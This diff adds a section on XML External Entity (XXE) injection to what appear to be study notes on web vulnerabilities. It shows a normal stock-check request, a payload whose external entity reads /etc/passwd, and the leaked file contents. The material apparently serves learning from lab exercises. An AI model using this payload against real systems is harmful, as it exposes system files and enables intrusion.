@@ -135,3 +135,19 @@
 		  ```
 		  <p>Status: All is well.</p>
 		  ```
+	- XXE(XML External Entity)
+		- ```
+		  <?xml version="1.0" encoding="UTF-8"?>
+		  <stockCheck><productId>381</productId></stockCheck>
+		  ```
+		- ```
+		  <?xml version="1.0" encoding="UTF-8"?>
+		  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		  <stockCheck><productId>&xxe;</productId></stockCheck>
+		  ```
+		- ```
+		  Invalid product ID: root:x:0:0:root:/root:/bin/bash
+		  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+		  ...
+		  ```
